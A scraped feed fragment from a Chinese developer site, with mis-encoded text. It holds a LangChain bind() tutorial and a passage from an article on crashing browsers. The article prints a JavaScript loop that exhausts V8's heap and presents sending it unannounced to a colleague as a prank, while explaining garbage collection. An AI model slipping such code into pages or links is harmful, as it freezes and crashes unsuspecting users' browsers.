content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainå­¦ä¹ æ€»ç»“-Runnableç»„ä»¶ bind å‡½æ•°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194366823/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒåœ¨é£æ‰¬AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:14:51.000Z" title="Tue Jan 13 2026 02:14:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Runnableç»„ä»¶ bind å‡½æ•°</h2>
<h3 data-id="heading-1">æ˜¯ä»€ä¹ˆ</h3>
<p><code>bind()</code> æ˜¯ LangChain ä¸­ Runnable ç»„ä»¶çš„æ–¹æ³•ï¼Œç”¨äº<strong>åŠ¨æ€æ·»åŠ é»˜è®¤è°ƒç”¨å‚æ•°</strong>ï¼Œåœ¨åˆ›å»º Runnable å®ä¾‹æ—¶é¢„è®¾éƒ¨åˆ†å‚æ•°å€¼ã€‚</p>
<h3 data-id="heading-2">æœ‰ä»€ä¹ˆç”¨</h3>
<ul>
<li><strong>ç®€åŒ–è°ƒç”¨</strong>ï¼šæå‰ç»‘å®šå›ºå®šå‚æ•°ï¼Œè°ƒç”¨æ—¶åªéœ€ä¼ å…¥å˜åŒ–å‚æ•°</li>
<li><strong>å‚æ•°å¤ç”¨</strong>ï¼šé¿å…æ¯æ¬¡ invoke éƒ½é‡å¤ä¼ ç›¸åŒå‚æ•°</li>
<li><strong>å¤šå‚åœºæ™¯</strong>ï¼šè§£å†³ RunnableLambda åªèƒ½æ¥æ”¶å•å‚çš„é—®é¢˜ï¼Œé€šè¿‡ bind é¢„è®¾éƒ¨åˆ†å‚æ•°</li>
<li><strong>åŠ¨æ€è¦†ç›–</strong>ï¼šåœ¨é“¾å¼è°ƒç”¨ä¸­åŠ¨æ€ä¿®æ”¹ LLM å‚æ•°ï¼ˆå¦‚ modelã€temperature ç­‰ï¼‰</li>
</ul>
<h3 data-id="heading-3">ä»£ç ç¤ºä¾‹</h3>
<h4 data-id="heading-4">ç¤ºä¾‹1ï¼šRunnableLambda é¢„è®¾é»˜è®¤å‚æ•°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.runnables <span class="hljs-keyword">import</span> RunnableLambda

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_weather</span>(<span class="hljs-params">location: <span class="hljs-built_in">str</span>, unit: <span class="hljs-built_in">str</span>, name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"<span class="hljs-subst">{name}</span>ä½ å¥½ï¼ŒæŸ¥è¯¢åˆ°<span class="hljs-subst">{location}</span>çš„å¤©æ°”æ˜¯25åº¦<span class="hljs-subst">{unit}</span>"</span>

<span class="hljs-comment"># ç»‘å®š unit å’Œ nameï¼Œè°ƒç”¨æ—¶åªéœ€ä¼  location</span>
get_weather_runnable = RunnableLambda(get_weather).bind(unit=<span class="hljs-string">"æ‘„æ°åº¦"</span>, name=<span class="hljs-string">"muxiaoke"</span>)

res = get_weather_runnable.invoke(<span class="hljs-string">"å¹¿å·"</span>)
<span class="hljs-comment"># è¾“å‡º: muxiaokeä½ å¥½ï¼ŒæŸ¥è¯¢åˆ°å¹¿å·çš„å¤©æ°”æ˜¯25åº¦æ‘„æ°åº¦</span>
</code></pre>
<h4 data-id="heading-5">ç¤ºä¾‹2ï¼šLLM é“¾å¼è°ƒç”¨ä¸­åŠ¨æ€è¦†ç›–æ¨¡å‹å‚æ•°</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> ChatPromptTemplate
<span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> StrOutputParser

prompt = ChatPromptTemplate.from_messages([(<span class="hljs-string">"human"</span>, <span class="hljs-string">"{query}"</span>)])
llm = ChatOpenAI(model=<span class="hljs-string">"moonshot-v1-8k"</span>)

<span class="hljs-comment"># ä½¿ç”¨ bind åŠ¨æ€è¦†ç›– model å‚æ•°ï¼Œä» 8k åˆ‡æ¢åˆ° 32k</span>
chain = prompt | llm.bind(model=<span class="hljs-string">"moonshot-v1-32k"</span>) | StrOutputParser()

content = chain.invoke({<span class="hljs-string">"query"</span>: <span class="hljs-string">"ä½ å¥½ï¼Œä½ æ˜¯ä»€ä¹ˆæ¨¡å‹ï¼Œç‰ˆæœ¬å·æ˜¯å¤šå°‘"</span>})
<span class="hljs-comment"># å®é™…ä½¿ç”¨çš„æ˜¯ moonshot-v1-32k æ¨¡å‹</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘æ˜¯å¦‚ä½•ç”¨ä¸€è¡Œ JS ä»£ç ï¼Œè®©ä½ çš„æµè§ˆå™¨å†…å­˜ç¬é—´å´©æºƒçš„ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7594396523439964195</link>    <guid>https://juejin.cn/post/7594396523439964195</guid>    <pubDate>2026-01-13T04:11:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594396523439964195" data-draft-id="7594303923362873384" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘æ˜¯å¦‚ä½•ç”¨ä¸€è¡Œ JS ä»£ç ï¼Œè®©ä½ çš„æµè§ˆå™¨å†…å­˜ç¬é—´å´©æºƒçš„ï¼Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-13T04:11:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘æ˜¯å¦‚ä½•ç”¨ä¸€è¡Œ JS ä»£ç ï¼Œè®©ä½ çš„æµè§ˆå™¨å†…å­˜ç¬é—´å´©æºƒçš„ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T04:11:47.000Z" title="Tue Jan 13 2026 04:11:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c3a3aa71a5740e6b4db46e14137b3a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=6qAFbero3ZHZC1HP9Pe0c2S59WE%3D" alt="image_w3wbkq.webp" loading="lazy"/></p>
<p>ä¸‹åˆèŒ¶æ—¶é—´ï¼Œæˆ‘ç»™éš”å£çš„åç«¯è€å“¥å‘äº†ä¸ªé“¾æ¥ã€‚</p>
<p>ä»–æ¯«æ— é˜²å¤‡åœ°ç‚¹å¼€äº†ã€‚</p>
<p>ä¸‰ç§’é’Ÿåï¼Œæˆ‘å¬åˆ°ä»–é‚£å° 16G å†…å­˜çš„ MacBook Pro é£æ‰‡å¼€å§‹ç‹‚å•¸ï¼Œä»¿ä½›è¦èµ·é£ğŸ¤£ã€‚</p>
<p>äº”ç§’é’Ÿåï¼Œä»–çš„é¼ æ ‡æŒ‡é’ˆå˜æˆäº†å½©è™¹åœˆï¼Œå¡åœ¨å±å¹•ä¸­é—´åŠ¨å¼¹ä¸å¾—ã€‚</p>
<p>åç§’é’Ÿåï¼ŒChrome æƒ¨å«ä¸€å£°ï¼Œå¼¹å‡ºäº†é‚£ä¸ªè®©æ— æ•°å‰ç«¯äººé—»é£ä¸§èƒ†çš„é¡µé¢â€”â€”(å´©æºƒå•¦)ã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4404d173be954a93b08999d7058cfca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=cwyjjK99etomM8rcBj0KZqR9n7g%3D" alt="57f8a59240236884e204a1cc951a851bc8ec20f4.png" loading="lazy"/></p>
<p>åç«¯è€å“¥è¿‡æ¥é—®æˆ‘ï¼šä½ åˆšæ‰å‘çš„æ˜¯ä»€ä¹ˆç—…æ¯’ï¼Ÿï¼ğŸ˜¡</p>
<p>æˆ‘æ·¡å®šåœ°å–äº†ä¸€å£å’–å•¡ï¼šæ²¡æœ‰ç—…æ¯’ï¼Œåªæ˜¯ä¸€è¡Œ JavaScript ä»£ç è€Œå·²ã€‚</p>
<p>ä»Šå¤©ï¼Œæˆ‘å°±å¸¦å¤§å®¶æ‹†è§£ä¸€ä¸‹è¿™ä¸ªå´©æºƒèƒŒåçš„åŸç†ã€‚è¿™ä¸ä»…æ˜¯ä¸ªæ¶ä½œå‰§ï¼Œæ›´æ˜¯æ·±å…¥ç†è§£ <strong>V8 å¼•æ“å†…å­˜æœºåˆ¶</strong> çš„ç»ä½³æœºä¼šã€‚</p>
<hr/>
<h3 data-id="heading-0">è¿™è¡Œä»£ç é•¿ä»€ä¹ˆæ ·å‘¢ï¼Ÿ</h3>
<p>âš ï¸ é«˜èƒ½é¢„è­¦ï¼šè¯·å‹¿åœ¨æœªä¿å­˜å·¥ä½œçš„æµè§ˆå™¨æ ‡ç­¾é¡µä¸­è¿è¡Œä»¥ä¸‹ä»£ç ï¼</p>
<p>âš ï¸ é«˜èƒ½é¢„è­¦ï¼šè¯·å‹¿åœ¨æœªä¿å­˜å·¥ä½œçš„æµè§ˆå™¨æ ‡ç­¾é¡µä¸­è¿è¡Œä»¥ä¸‹ä»£ç ï¼</p>
<p>âš ï¸ é«˜èƒ½é¢„è­¦ï¼šè¯·å‹¿åœ¨æœªä¿å­˜å·¥ä½œçš„æµè§ˆå™¨æ ‡ç­¾é¡µä¸­è¿è¡Œä»¥ä¸‹ä»£ç ï¼</p>
<p>é‡è¦çš„äº‹ï¼Œå…ˆè¯´ä¸‰éğŸ˜ƒ</p>
<p>å¦‚æœä½ æƒ³è®©æµè§ˆå™¨ç¬é—´æš´æ¯™ï¼Œå…¶å®ä¸éœ€è¦ä»€ä¹ˆå¤æ‚çš„é»‘å®¢æŠ€æœ¯ã€‚æœ€ç®€å•ç²—æš´çš„æ–¹å¼ï¼Œå°±æ˜¯ <strong>å †æº¢å‡º (Heap Overflow)</strong>ã€‚</p>
<p>æ ¸å¿ƒä»£ç åªæœ‰è¿™ä¸€è¡Œï¼ˆä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼Œæˆ‘ç¨å¾®å±•å¼€ä¸€ç‚¹ï¼‰ï¼š</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// å°±æ˜¯å®ƒï¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">boom</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span> = [];
  <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// åˆ†é… 20MB çš„ TypedArray</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-property">leakArr</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(<span class="hljs-number">20</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>));
  }, <span class="hljs-number">10</span>);
};

<span class="hljs-title function_">boom</span>();
</code></pre>
<p><strong>åŸç†æå…¶ç®€å•ï¼š</strong></p>
<ol>
<li>æˆ‘ä»¬å¼€äº†ä¸€ä¸ª <code>setInterval</code> å®šæ—¶å™¨ï¼Œæ¯ 10 æ¯«ç§’æ‰§è¡Œä¸€æ¬¡ã€‚</li>
<li><code>new Uint8Array(20 * 1024 * 1024)</code> ä¼šåˆ›å»ºä¸€ä¸ªçº¦ 20MB çš„ TypedArrayã€‚</li>
<li>æœ€å…³é”®çš„ä¸€æ­¥ï¼šæˆ‘ä»¬å°†è¿™ä¸ªTypedArray <code>push</code> è¿›äº†ä¸€ä¸ª<strong>å…¨å±€å˜é‡</strong> <code>window.leakArr</code> ä¸­ã€‚</li>
</ol>
<p>å› ä¸º leakArr æ˜¯æŒ‚åœ¨ window ä¸Šçš„ï¼Œæµè§ˆå™¨ä¼šè®¤ä¸ºï¼šè¿™ä¸ªæ•°æ®ç”¨æˆ·è¿˜è¦ç”¨ï¼Œæˆ‘ä¸èƒ½å›æ”¶ï¼</p>
<p>äºæ˜¯ï¼ŒGCï¼ˆåƒåœ¾å›æ”¶å™¨ï¼‰ä¸æ•¢åŠ¨å®ƒã€‚</p>
<p>å†…å­˜å°±åƒè¢«æ³¨æ°´ä¸€æ ·ç¬é—´é£™å‡ã€‚</p>
<p>1ç§’é’Ÿå¢åŠ  1GBï¼Œå‡ ç§’é’Ÿåï¼ŒChrome çš„ V8 å¼•æ“å°±ä¼šå› ä¸ºè¾¾åˆ° Heap Limitï¼ˆå †ä¸Šé™ï¼‰ è€Œå´©æºƒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5b32a37ab634edebf43646a0139db44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXJwYW5PbWVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768882306&amp;x-signature=J1Ba3ESHOpsEF8HXhC9pDPEFO0w%3D" alt="screenshot-20260113-114331.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-1">æµè§ˆå™¨æ˜¯æ€ä¹ˆæ­»çš„ï¼Ÿ</h3>
<p>å¾ˆå¤šå…„å¼Ÿä¼šé—®ï¼šæˆ‘ç”µè„‘ 32G å†…å­˜ï¼Œè¿™æ‰å“ªåˆ°å“ªï¼Ÿä¸ºä»€ä¹ˆæµè§ˆå™¨è¿™ä¹ˆè„†ï¼Ÿ</p>
<p>è¿™é‡Œå°±è¦è®²åˆ° Node.js å’Œ Chrome V8 çš„ä¸€ä¸ªé™åˆ¶ã€‚</p>
<h4 data-id="heading-2">V8 çš„å†…å­˜é™åˆ¶ï¼ˆHeap Limitï¼‰</h4>
<p>Chrome å¹¶ä¸æ˜¯ä½ æœ‰å¤šå°‘ç‰©ç†å†…å­˜ï¼Œå®ƒå°±æ•¢ç”¨å¤šå°‘ã€‚</p>
<p>ä¸ºäº†é˜²æ­¢ç½‘é¡µå ç”¨è¿‡å¤šèµ„æºå¯¼è‡´ç³»ç»Ÿå¡æ­»ï¼ŒV8 å¯¹æ¯ä¸ªé¡µé¢çš„ JS å †å†…å­˜æ˜¯æœ‰ç¡¬æ€§é™åˆ¶çš„ã€‚</p>
<ul>
<li>åœ¨ 64 ä½ç³»ç»Ÿä¸‹ï¼Œé»˜è®¤é™åˆ¶é€šå¸¸åœ¨ <strong>1.4GB - 4GB</strong> ä¹‹é—´ï¼ˆå–å†³äº Chrome ç‰ˆæœ¬å’Œè®¾å¤‡ï¼‰ã€‚</li>
</ul>
<p>å½“ä½ é‚£è¡Œä»£ç ç–¯ç‹‚ç”³è¯·å†…å­˜æ—¶ï¼ŒV8 çš„å¤„ç†æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li><strong>ç¬¬ 1 ç§’</strong>ï¼šå†…å­˜å ç”¨ 500MBã€‚GCï¼šè¿˜è¡Œï¼Œèƒ½æ’‘ä½ã€‚</li>
<li><strong>ç¬¬ 2 ç§’</strong>ï¼šå†…å­˜å ç”¨ 1.5GBã€‚GCï¼šå§æ§½ï¼Ÿå¿«æ»¡äº†ï¼èµ¶ç´§ Full GCï¼ˆå…¨é‡å›æ”¶ï¼‰ä¸€ä¸‹ï¼</li>
<li><strong>ç¬¬ 2.1 ç§’</strong>ï¼šGC å‘ç° <code>leakArr</code> è¢« <code>window</code> å¼•ç”¨ç€ï¼Œ<strong>ä¸€ä¸ªå­—èŠ‚éƒ½å›æ”¶ä¸æ‰</strong>ã€‚</li>
<li><strong>ç¬¬ 3 ç§’</strong>ï¼šå†…å­˜çªç ´é™åˆ¶ã€‚V8ï¼šæ¯ç­å§ï¼Œç´¯äº†ğŸ˜–ã€‚ -&gt; <strong>Crashã€‚</strong></li>
</ul>
<h4 data-id="heading-3">ä¸»çº¿ç¨‹é˜»å¡ (The UI Freeze)</h4>
<p>åœ¨å´©æºƒå‰ï¼Œä¸ºä»€ä¹ˆé¼ æ ‡ä¼šå¡æ­»ï¼Ÿ</p>
<p>å› ä¸º JS æ˜¯å•çº¿ç¨‹çš„ã€‚</p>
<p>å½“å†…å­˜å¿«æ»¡æ—¶ï¼ŒGC ä¼šç–¯ç‹‚ä»‹å…¥ï¼Œè¯•å›¾è…¾å‡ºç©ºé—´ã€‚GC çš„æ‰§è¡Œæ˜¯ä¼šé˜»å¡ä¸»çº¿ç¨‹çš„ã€‚</p>
<p>CPU éƒ½åœ¨å¿™ç€åšåƒåœ¾å›æ”¶ï¼Œæ ¹æœ¬æ²¡ç©ºå»å“åº”ä½ çš„é¼ æ ‡ç§»åŠ¨å’Œé¡µé¢æ¸²æŸ“ã€‚</p>
<hr/>
<h3 data-id="heading-4">ä½ å¯èƒ½æ¯å¤©éƒ½åœ¨å†™ BugğŸ¤”</h3>
